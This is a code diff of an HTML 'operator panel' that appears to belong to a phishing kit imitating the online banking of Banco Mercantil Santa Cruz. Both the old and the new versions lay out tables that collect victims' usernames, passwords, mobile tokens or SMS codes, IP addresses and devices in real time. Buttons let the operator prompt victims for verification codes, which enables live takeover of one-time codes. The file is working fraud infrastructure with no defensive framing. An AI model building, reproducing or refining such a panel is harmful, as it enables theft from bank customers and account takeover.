@@ -2,106 +2,165 @@
 <html lang="es">
 <head>
   <meta charset="utf-8" />
-  <title>BMSC — Panel de Operador</title>
+  <title>Banca por Internet — Operador</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <link rel="shortcut icon" href="/img/favicon.svg" type="image/svg+xml" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="/panel/css/panel.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="css/panel.css" />
 </head>
 <body>
-  <div class="dash-wrapper">
-    <header class="navbar">
-      <div class="navbar-brand">
-        <img src="https://www.bmsc.com.bo/_nuxt/img/header-logo.96143ea.svg" alt="Mercantil Santa Cruz" class="brand-logo" />
-        <div class="brand-title">
-          <h1>Panel de Control de Operaciones</h1>
-          <span class="brand-subtitle">Banca por Internet · BMSC</span>
-        </div>
+  <main class="dash">
+    <header class="toolbar">
+      <div class="toolbar__left">
+        <h1 class="toolbar__title">Mercantil Santa Cruz</h1>
+        <span class="toolbar__meta">Sesiones: <strong id="rowCount">0</strong> · usa Dinámica o SMS en Acciones
+          <button type="button" class="sound-toggle" id="audioStatus" aria-pressed="true" title="Activar o desactivar sonido">🔊 Sonido: ON</button>
+        </span>
       </div>
-      
-      <div class="navbar-stats">
-        <div class="stat-pill" title="Sesiones registradas hoy">
-          <span class="stat-label">Total:</span>
-          <strong id="statTotal" class="stat-val">0</strong>
-        </div>
-        <div class="stat-pill stat-pill--online" title="Usuarios conectados actualmente">
-          <span class="stat-dot"></span>
-          <span class="stat-label">En línea:</span>
-          <strong id="statOnline" class="stat-val">0</strong>
-        </div>
-        <div class="stat-pill stat-pill--wait" title="Usuarios esperando acción">
-          <span class="stat-label">En espera:</span>
-          <strong id="statWaiting" class="stat-val">0</strong>
-        </div>
-      </div>
-
-      <div class="navbar-actions">
-        <button type="button" class="btn btn-audio" id="audioToggle" aria-pressed="true" title="Activar o desactivar alertas de sonido">
-          🔊 Sonido: ON
-        </button>
-        <button type="button" class="btn btn-clean" id="btnClean" title="Limpiar todas las sesiones">
-          Limpiar
-        </button>
-        <button type="button" class="btn btn-export" id="btnExport" title="Descargar reporte en bloc de notas">
-          Guardar TXT
-        </button>
-        <a class="btn btn-portal" href="/banca-por-internet" target="_blank" title="Abrir portal de Banca por Internet">
-          Ir a Banca
-        </a>
+      <div class="toolbar__actions">
+        <button type="button" class="btn btn--ok" id="btnClean">Limpiar</button>
+        <button type="button" class="btn btn--done" id="btnExport" style="background: #0b5ed7;">Guardar</button>
+        <a class="btn btn--ghost" href="/banca-por-internet" target="_blank">Banca por Internet</a>
       </div>
     </header>
 
-    <div class="filter-bar">
-      <div class="filter-lanes">
-        <span class="filter-label">Filtrar por carril:</span>
-        <button type="button" class="lane-tab is-active" data-filter="all">Todos (<span id="countAll">0</span>)</button>
-        <button type="button" class="lane-tab lane-tab--1" data-filter="0">Azul (<span id="countLane0">0</span>)</button>
-        <button type="button" class="lane-tab lane-tab--2" data-filter="1">Verde (<span id="countLane1">0</span>)</button>
-        <button type="button" class="lane-tab lane-tab--3" data-filter="2">Rojo (<span id="countLane2">0</span>)</button>
-        <button type="button" class="lane-tab lane-tab--4" data-filter="3">Gris (<span id="countLane3">0</span>)</button>
-        <button type="button" class="lane-tab lane-tab--5" data-filter="4">Amarillo (<span id="countLane4">0</span>)</button>
-      </div>
-      <div class="server-status" id="serverStatus">
-        <span class="status-indicator live"></span>
-        <span id="statusText">En vivo</span>
-      </div>
+    <p class="empty is-visible" id="emptyState">
+      Cola vacía. Esperando usuarios de Banca por Internet…
+    </p>
+
+    <div class="sections" id="sections">
+      <section class="lane lane--1" data-lane="0">
+        <div class="lane__head">
+          <span class="lane__title">Azul</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Tipo</th>
+              <th>Dispositivo</th>
+              <th>IP</th>
+              <th>Usuario</th>
+              <th>Clave</th>
+              <th>Token</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="0"></tbody>
+        </table>
+      </section>
+
+      <section class="lane lane--2" data-lane="1">
+        <div class="lane__head">
+          <span class="lane__title">Verde</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Tipo</th>
+              <th>Dispositivo</th>
+              <th>IP</th>
+              <th>Usuario</th>
+              <th>Clave</th>
+              <th>Token</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="1"></tbody>
+        </table>
+      </section>
+
+      <section class="lane lane--3" data-lane="2">
+        <div class="lane__head">
+          <span class="lane__title">Rojo</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Tipo</th>
+              <th>Dispositivo</th>
+              <th>IP</th>
+              <th>Usuario</th>
+              <th>Clave</th>
+              <th>Token</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="2"></tbody>
+        </table>
+      </section>
+
+      <section class="lane lane--4" data-lane="3">
+        <div class="lane__head">
+          <span class="lane__title">Gris</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Tipo</th>
+              <th>Dispositivo</th>
+              <th>IP</th>
+              <th>Usuario</th>
+              <th>Clave</th>
+              <th>Token</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="3"></tbody>
+        </table>
+      </section>
+
+      <section class="lane lane--5" data-lane="4">
+        <div class="lane__head">
+          <span class="lane__title">Amarillo</span>
+          <span class="lane__count" data-lane-count>0</span>
+        </div>
+        <table class="grid">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Hora</th>
+              <th>Tipo</th>
+              <th>Dispositivo</th>
+              <th>IP</th>
+              <th>Usuario</th>
+              <th>Clave</th>
+              <th>Token</th>
+              <th>Estado</th>
+              <th>Badge</th>
+              <th>Acciones</th>
+            </tr>
+          </thead>
+          <tbody data-lane-body="4"></tbody>
+        </table>
+      </section>
     </div>
 
-    <div class="empty-state is-visible" id="emptyState">
-      <div class="empty-icon">📥</div>
-      <h3>Cola de espera vacía</h3>
-      <p>Cuando un cliente ingrese su usuario y contraseña en <strong>Banca por Internet</strong>, aparecerá aquí en tiempo real.</p>
-    </div>
+    <p class="footer-note" id="hint">
+      En Acciones: 🖼️ Imagen solicita contraseña enviando la imagen, Dinámica y SMS envían el código de verificación.
+    </p>
+  </main>
 
-    <div class="table-container" id="tableContainer">
-      <table class="data-table">
-        <thead>
-          <tr>
-            <th class="th-num">#</th>
-            <th class="th-time">Hora</th>
-            <th class="th-lane">Carril</th>
-            <th class="th-device">Dispositivo</th>
-            <th class="th-ip">IP</th>
-            <th class="th-user">Usuario</th>
-            <th class="th-pass">Contraseña</th>
-            <th class="th-token">Clave Móvil / SMS</th>
-            <th class="th-online">Conexión</th>
-            <th class="th-state">Estado</th>
-            <th class="th-actions">Acciones del Operador</th>
-          </tr>
-        </thead>
-        <tbody id="sessionsTbody"></tbody>
-      </table>
-    </div>
-
-    <footer class="dash-footer">
-      <span id="footerNote">Listo para recibir sesiones. Pulsa "Clave Móvil" o "SMS" para solicitar verificación al cliente.</span>
-      <span class="footer-copy">Banco Mercantil Santa Cruz S.A. · Sistema de Monitoreo Interno</span>
-    </footer>
-  </div>
-
-  <script src="/panel/js/panel.js"></script>
+  <script src="js/panel.js?v=bmsc_v1"></script>
 </body>
 </html>
